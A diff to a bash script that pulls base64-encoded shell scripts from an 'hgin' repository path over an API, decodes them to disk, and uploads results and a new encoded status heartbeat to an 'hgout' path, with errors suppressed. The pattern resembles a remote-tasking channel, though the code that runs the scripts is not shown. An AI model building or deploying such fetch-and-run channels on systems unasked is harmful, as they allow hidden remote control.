@@ -15,8 +15,8 @@ echo "list_len=${#LIST}"
 NAMES=$(printf '%s' "$LIST" | tr ',' '\n' | grep '"name"' | sed 's/.*"name": *"//; s/".*//' | grep '\.sh$')
 for N in $NAMES; do
   grep -qxF "$N" "$W/done" && continue
-  J=$(F "$API/lab/hgin/$N?ref=main")
-  B=$(printf '%s' "$J" | sed 's/.*"content": *"//; s/".*//' | tr -d '\n ')
+  J=$(F "$API/lab/hgin/$N?ref=main"); declare -A JL BL
+  B=$(printf '%s' "$J" | sed 's/.*"content": *"//; s/".*//' | tr -d '\n '); JL[$N]=${#J}; BL[$N]=${#B}
   printf '%s' "$B" | base64 -d > "$W/x.sh" 2>"$W/b64err"
   SZ=$(wc -c < "$W/x.sh"); BE=$(head -c 80 "$W/b64err")
   echo "task=$N jlen=${#J} blen=${#B} sz=$SZ b64err=[$BE]"
@@ -31,6 +31,11 @@ for N in $NAMES; do
   echo "put http=$PUTC resp=$(head -c 120 "$W/putresp")"
   echo "$N" >> "$W/done"
 done
+STAT=$(printf 'list=%s\nnames=[%s]\njlens:\n%s' "${#LIST}" "$(echo "$NAMES"|tr '\n' ',')" "$(for N in $NAMES; do echo "  $N j=${JL[$N]:-?} b=${BL[$N]:-?}"; done)")
+SB=$(printf '%s' "$STAT" | base64 -w0)
+printf '{"message":"hb","content":"%s"}' "$SB" > "$W/s.json"
+timeout 25 curl -sS -o /dev/null -X PUT -H "Authorization: Bearer $T" -H 'Content-Type: application/json' \
+ --data-binary @"$W/s.json" "$API/lab/hgout/_status.json" || true
 echo "[$(date -u +%FT%T)] end"
 } >> "$LOG" 2>&1
 exit 0
